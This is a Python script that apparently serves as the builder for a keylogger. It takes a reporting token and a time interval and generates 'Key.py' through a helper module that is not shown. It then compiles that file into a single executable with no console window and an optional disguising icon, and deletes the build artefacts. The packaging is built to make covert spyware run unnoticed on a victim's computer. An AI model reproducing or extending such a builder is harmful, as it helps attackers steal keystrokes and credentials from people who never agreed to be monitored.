# -*- coding: utf-8 -*-
from Utils.generator import build_t
from Utils.banne_r import banner, G, R, B, X, Q, WI, Y, BOOLD, F, res, bl
from shutil import rmtree
import os
from subprocess import call

class EngyRun:
    def __init__(self):
        self.filenampackeg = "Key.py"

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

    def display_banner(self):
        print(banner)

    def enjoy_my_art(self, token, time_interval):
        build_t(token, time_interval)

    def clean_up(self):
        try:
            file_base = os.path.splitext(self.filenampackeg)[0]
            spec_file = f"{file_base}.spec"
            if os.path.exists(self.filenampackeg):
                os.remove(self.filenampackeg)
            if os.path.exists(spec_file):
                os.remove(spec_file)
            rmtree("__pycache__", ignore_errors=True)
            rmtree("build", ignore_errors=True)
        except Exception as e:
            print(f"Cleanup error: {e}")

    def compile(self, include_icon=False, icon_path=None):
        try:
            command = ["pyinstaller", "--onefile", "--noconsole"]
            if include_icon and icon_path:
                command.extend(["--icon", icon_path])
            command.append(self.filenampackeg)
            call(command)
            self.clean_up()
        except Exception as e:
            print(f"Compilation error: {e}")

    def get_user_input(self, prompt):
        try:
            return input(f"{prompt}: ").strip()
        except KeyboardInterrupt:
            print("\nOperation canceled by user.")
            exit(0)

    def choose(self):
        self.clear_screen()
        self.display_banner()

        try:
            self.token = self.get_user_input("Enter your token")
            self.time_interval = self.get_user_input("Enter time interval (in minutes)")
            self.enjoy_my_art(self.token, self.time_interval)

            compile_choice = self.get_user_input("Compile Python file to EXE? (Y/N)").lower()
            if compile_choice == "y":
                icon_choice = self.get_user_input("Do you want to set an icon? (Y/N)").lower()
                if icon_choice == "y":
                    icon_path = self.get_user_input("Enter the path to your icon file")
                    self.compile(include_icon=True, icon_path=icon_path)
                else:
                    self.compile()
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    EngyRun().choose()